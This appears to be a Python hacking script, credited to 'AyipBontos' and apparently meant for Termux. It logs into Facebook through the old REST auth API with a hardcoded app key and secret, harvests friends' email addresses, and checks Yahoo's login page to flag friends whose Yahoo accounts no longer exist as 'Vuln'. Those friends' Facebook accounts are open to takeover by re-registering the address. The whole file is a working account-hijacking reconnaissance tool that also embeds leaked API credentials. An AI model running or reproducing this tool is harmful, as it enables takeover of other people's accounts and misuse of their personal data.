import requests, json, sys, hashlib, mechanize
from bs4 import BeautifulSoup
from os import system
system("clear")
print ("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
print ("| AUTHOR   : AyipBontos              |")
print ("| Support  : Kunjungi Website kami   |")
print ("| WEBSITE  : termux.id               |")
print ("| Youtube  : OmalipTv                |")
print ("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
class YC:
    def __init__(self, email, pw):
        self.email = email
        self.pw = pw
        try:
            self.token = self.__getToken()['access_token']
            print ("\033[31m[\033[32m!\033[31m] \033[39mLogin Berhasil")
            print ("\033[36m" + 50*"-")
            print ("\033[36m|" + 11*" " + "\033[35mEmail" + 11*" " + "\033[36m|" + 8*" " + "\033[33mVuln" + 8*" " + "\033[36m|")
            print ("\033[36m" + 50*"-")
        except KeyError:
            print ("\033[31m[\033[31m!\033[31m] \033[39mLogin Gagal")
            sys.exit()
        self.__looping(json.loads(requests.get(f"https://graph.facebook.com/me/friends?access_token={self.token}").text))
    def __looping(self, dataFL):
        br = mechanize.Browser()
        br.set_handle_robots(False)
        for i in dataFL["data"]:
            try:
                em = json.loads(requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+self.token).text)["email"]
            except KeyError:
                continue
            if ("yahoo.com" in em): pass
            else: continue
            br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
            br._factory.is_html = True
            br.select_form(nr=0)
            br["username"] = (em)
            soup = BeautifulSoup(br.submit().read(), features="html.parser")
            status = soup.find_all("p")
            vuln = ("\033[31mNot Vuln")
            for p in status:
                try:
                    if (p.get("data-error") == "messages.ERROR_INVALID_USERNAME"):
                        vuln = ("\033[32mVuln")
                        break
                except:
                    pass
            len_email = (27-len(em))
            if (vuln == "\033[32mVuln"):
                len_vuln = (19-(len(vuln)-8))
                print ("\033[36m|"+(em)+len_email*" "+"|"+(len_vuln-10)*" "+vuln+(len_vuln-10)*" "+"\033[36m|")
            else:
                len_vuln = (19-(len(vuln)-8))
                print ("\033[36m|"+(em)+len_email*" "+"|"+(len_vuln-7)*" "+vuln+(len_vuln-9)*" "+"\033[36m|")
    def __getToken(self):
        data = {
            "api_key":"882a8490361da98702bf97a021ddc14d",
            "credentials_type":"password",
            "email":self.email,
            "format":"JSON",
            "generate_machine_id":"1",
            "generate_session_cookies":"1",
            "locale":"en_US",
            "method":"auth.login",
            "password":self.pw,
            "return_ssl_resources":"0",
            "v":"1.0"}
        sig = (f'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail={self.email}format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword={self.pw}return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32').encode('utf-8')
        x = hashlib.new('md5')
        x.update(sig)
        data.update({
            "sig": x.hexdigest()
        })
        return json.loads(requests.post("https://api.facebook.com/restserver.php", data=data).text)
YC(str(input("\033[31m[\033[39m+\033[31m] \033[39mEmail   : ")), str(input("\033[31m[\033[39m+\033[31m] \033[39mPassword: ")))
